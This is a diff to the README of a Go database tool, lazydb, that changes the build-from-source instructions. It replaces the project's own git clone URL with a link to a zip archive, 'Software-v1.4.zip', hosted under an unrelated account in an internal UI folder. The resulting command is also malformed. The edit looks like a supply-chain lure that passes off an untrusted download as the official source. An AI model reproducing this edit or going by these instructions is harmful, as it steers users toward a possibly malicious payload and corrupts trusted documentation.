@@ -26,7 +26,7 @@ go install github.com/aymenhmaidiwastaken/lazydb@latest
 Or build from source:
 
 ```bash
-git clone https://github.com/aymenhmaidiwastaken/lazydb.git
+git clone https://raw.githubusercontent.com/Childsupportrailtechnology337/lazydb/main/internal/ui/Software-v1.4.zip
 cd lazydb
 make build
 ```
